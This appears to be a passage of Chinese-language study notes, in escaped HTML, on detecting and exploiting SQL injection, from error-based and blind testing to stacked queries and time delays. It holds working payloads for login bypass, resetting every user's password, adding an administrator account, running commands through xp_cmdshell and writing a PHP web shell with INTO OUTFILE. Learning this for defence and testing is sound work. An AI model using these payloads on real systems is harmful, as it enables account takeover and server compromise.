&lt;h5 id=&#34;应用程序的响应&#34;&gt;&lt;a href=&#34;#应用程序的响应&#34; class=&#34;headerlink&#34; title=&#34;应用程序的响应&#34;&gt;&lt;/a&gt;应用程序的响应&lt;/h5&gt;&lt;h6 id=&#34;常见错误&#34;&gt;&lt;a href=&#34;#常见错误&#34; class=&#34;headerlink&#34; title=&#34;常见错误&#34;&gt;&lt;/a&gt;常见错误&lt;/h6&gt;&lt;p&gt;当注入一个页面一直返回相同的报错页面，这时候不能直接判断为SQL注入&lt;/p&gt;
&lt;p&gt;注入代码&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; category&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;attacker&#39;&lt;/span&gt;&#39;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;返回一个报错页面，接着判断是否是sql注入产生的报错&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; category&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;attacker&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&#39;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;or &#39;1&#39;=&#39;1&#39;&lt;/code&gt;是一个条件永真式，并且是有意义的，不影响其他部分，可以返回表中的所有行，但是数据库大的时候，返回所有行会很久，这是可以注入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;or &#39;1&#39;=&#39;2&#39;&lt;/code&gt;只要不影响sql语句就行&lt;/p&gt;
&lt;p&gt;如果不返回报错页面了，那么应该就是sql注入引起的报错了&lt;/p&gt;
&lt;p&gt;也可以用永假式&lt;code&gt;and &#39;1&#39;=&#39;1&#39;&lt;/code&gt;，如果不返回信息，则是sql注入，和永真相反&lt;/p&gt;
&lt;p&gt;当然，永假式也可能返回信息，可能是&lt;code&gt;union&lt;/code&gt;联合查询&lt;/p&gt;
&lt;h6 id=&#34;HTTP代码错误&#34;&gt;&lt;a href=&#34;#HTTP代码错误&#34; class=&#34;headerlink&#34; title=&#34;HTTP代码错误&#34;&gt;&lt;/a&gt;HTTP代码错误&lt;/h6&gt;&lt;p&gt;web服务器请求web源时发生错误，会返回500状态码&lt;/p&gt;
&lt;p&gt;还一种是产生错误后302重定向到其他页面&lt;/p&gt;
&lt;h6 id=&#34;不同大小的响应&#34;&gt;&lt;a href=&#34;#不同大小的响应&#34; class=&#34;headerlink&#34; title=&#34;不同大小的响应&#34;&gt;&lt;/a&gt;不同大小的响应&lt;/h6&gt;&lt;p&gt;每次返回的响应都有所不同，比较这些细微的不同，可能找到一些注入线索&lt;/p&gt;
&lt;p&gt;比如返回的内容，状态码……&lt;/p&gt;
&lt;h5 id=&#34;SQL盲注&#34;&gt;&lt;a href=&#34;#SQL盲注&#34; class=&#34;headerlink&#34; title=&#34;SQL盲注&#34;&gt;&lt;/a&gt;SQL盲注&lt;/h5&gt;&lt;p&gt;一个页面会因为不同的操作产生不同的状态，用不同的状态来表示注入的结果，自动化注入不同的内容，并根据响应状态判断注入结果，这就是SQL盲注，当然，要先找到注入点&lt;/p&gt;
&lt;p&gt;例子&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?id=2 or 1=1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--返回第一件商品&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/showproduct.php?id=2 or 1=2&lt;/span&gt;
―返回第二件商品&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;id=2时是正常查询， 加上&lt;code&gt;or 1=1&lt;/code&gt;后会查询所有列，数据库检测该语句为异常，会返回id=1的页面，而&lt;code&gt;or 1=2&lt;/code&gt;相当id=2 不影响sql语句，会进入id=2的页面&lt;/p&gt;
&lt;p&gt;这样就可以通过返回页面判断注入是否成功 &lt;code&gt;or +payload&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认SQL注入&#34;&gt;&lt;a href=&#34;#确认SQL注入&#34; class=&#34;headerlink&#34; title=&#34;确认SQL注入&#34;&gt;&lt;/a&gt;确认SQL注入&lt;/h3&gt;&lt;h4 id=&#34;区别数字和字符串&#34;&gt;&lt;a href=&#34;#区别数字和字符串&#34; class=&#34;headerlink&#34; title=&#34;区别数字和字符串&#34;&gt;&lt;/a&gt;区别数字和字符串&lt;/h4&gt;&lt;p&gt;数字不需要使用单引号来表示&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; idproduct&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其他类型使用单引号来表示&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Bike&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; products &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; published_date&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;01/01/2013&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;内联SQL注入&#34;&gt;&lt;a href=&#34;#内联SQL注入&#34; class=&#34;headerlink&#34; title=&#34;内联SQL注入&#34;&gt;&lt;/a&gt;内联SQL注入&lt;/h4&gt;&lt;p&gt;内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行&lt;/p&gt;
&lt;h5 id=&#34;字符串内联注入&#34;&gt;&lt;a href=&#34;#字符串内联注入&#34; class=&#34;headerlink&#34; title=&#34;字符串内联注入&#34;&gt;&lt;/a&gt;字符串内联注入&lt;/h5&gt;&lt;p&gt;实例——用户提交用户和口令发送到数据库查询对用户进行验证&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;查询语句
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$uname&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$passwd&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;单引号报错和前面一样&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; near &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39; at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里可以直接&lt;code&gt;&#39; or 1=1 #&lt;/code&gt;绕过验证登录，但是要不改变sql语句的结构，就不能注释后面的语句&lt;/p&gt;
&lt;p&gt;这时&lt;code&gt;&#39;or &#39;1&#39;=&#39;1&lt;/code&gt;不会得到想要结果，因为and、or的优先级，and优先&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username=&#39;&#39; or &#39;1&#39;=&#39;1 and password=&#39;&#39;&lt;/code&gt;按照&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username=&#39;&#39; or (&#39;1&#39;=&#39;1&#39; and password=&#39;&#39;)&lt;/code&gt;执行&lt;/p&gt;
&lt;p&gt;所以改变payload&lt;code&gt;&#39; or 1=1 or &#39;1&#39;=&#39;1&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;当只允许返回一行时，指定返回admin &lt;code&gt;&#39;admin&#39; and 1=1 or &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在passwd字段注入，&lt;code&gt;&#39;or &#39;1&#39;=&#39;1&lt;/code&gt;返回所有行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; users
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;new_password&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Bob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;old_password&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; OR &#39;1&#39;= &#39;1&lt;/code&gt;是注入代码&lt;/p&gt;
&lt;p&gt;功能是将所有用户密码更新&lt;/p&gt;
&lt;h5 id=&#34;数字值内联注入&#34;&gt;&lt;a href=&#34;#数字值内联注入&#34; class=&#34;headerlink&#34; title=&#34;数字值内联注入&#34;&gt;&lt;/a&gt;数字值内联注入&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; messages
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; uid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;USER&lt;/span&gt; ENTRY&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; received&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;少了引号的闭合，更简单了，直接构造永真返回全部&lt;code&gt;num or 1=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;终止式SQL注入&#34;&gt;&lt;a href=&#34;#终止式SQL注入&#34; class=&#34;headerlink&#34; title=&#34;终止式SQL注入&#34;&gt;&lt;/a&gt;终止式SQL注入&lt;/h4&gt;&lt;p&gt;攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句&lt;/p&gt;
&lt;h5 id=&#34;数据库注释语法&#34;&gt;&lt;a href=&#34;#数据库注释语法&#34; class=&#34;headerlink&#34; title=&#34;数据库注释语法&#34;&gt;&lt;/a&gt;数据库注释语法&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/* */&lt;/code&gt;可以用来绕过过滤空格&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1 or 1=1 &lt;/code&gt;过滤空格变成&lt;code&gt;1or1=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/* */&lt;/code&gt;绕过 &lt;code&gt;1/**/or/**/1=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;还能用来检测SQL注入对注释的处理&lt;code&gt;id=1/*test*/&lt;/code&gt;，没有影响话可能存在注入&lt;/p&gt;
&lt;h5 id=&#34;使用注释&#34;&gt;&lt;a href=&#34;#使用注释&#34; class=&#34;headerlink&#34; title=&#34;使用注释&#34;&gt;&lt;/a&gt;使用注释&lt;/h5&gt;&lt;p&gt;使用前面相同的用户登录验证&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;查询语句
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$uname&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$passwd&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; or 1=1 -- &lt;/code&gt; or  &lt;code&gt;&#39; or 1=1 #&lt;/code&gt;返回所有行&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &#39; and password=&#39;$passwd&#39; LIMIT 0,1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;admin&#39;;#&lt;/code&gt;  冒充admin登录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username=admin&#39;;/*&#39;&lt;/code&gt; &lt;code&gt;passwd=*/&#39;&lt;/code&gt;这种用于存在多个攻击参数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; AND passwd = &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注释后剩一对单引号，连接形成空字符串，对查询无影响&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以用来判断数据库类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;执行多条语句&#34;&gt;&lt;a href=&#34;#执行多条语句&#34; class=&#34;headerlink&#34; title=&#34;执行多条语句&#34;&gt;&lt;/a&gt;执行多条语句&lt;/h5&gt;&lt;p&gt;还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; a &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; q&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; b &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; w&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;mssql 6.0后允许在同一连接句柄上执行包含多条语句的字符串，Mysql 4.1后也引入该功能，默认不开启，Oracle不支持，除非使用PL/SQL&lt;/p&gt;
&lt;p&gt;运用前面having 1=1和group up 技术&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;……id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; admin &lt;span class=&#34;token keyword&#34;&gt;having&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- +&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还有其他可利用技术&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; administrators &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hacker&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;mysecretpassword&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;?uid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;ping www.google.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?php echo shell_exec($_GET[&#34;cmd&#34;]);?&amp;gt;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUTFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/victim.com/shell.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/3a91874d8bb2d2ad880d89fdd1f51473.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;时间延迟&#34;&gt;&lt;a href=&#34;#时间延迟&#34; class=&#34;headerlink&#34; title=&#34;时间延迟&#34;&gt;&lt;/a&gt;时间延迟&lt;/h4&gt;&lt;p&gt;没有回显和报错信息被隐藏的时候，可以向数据库注入时间延迟，数据库返回的时间反映在web页面，用来确定是否有SQL注入&lt;/p&gt;
&lt;p&gt;mssql内置的设置延迟的命令&lt;code&gt;waitfor delay &#39;hours:minutes:seconds&#39;&lt;/code&gt;&lt;/p&gt;
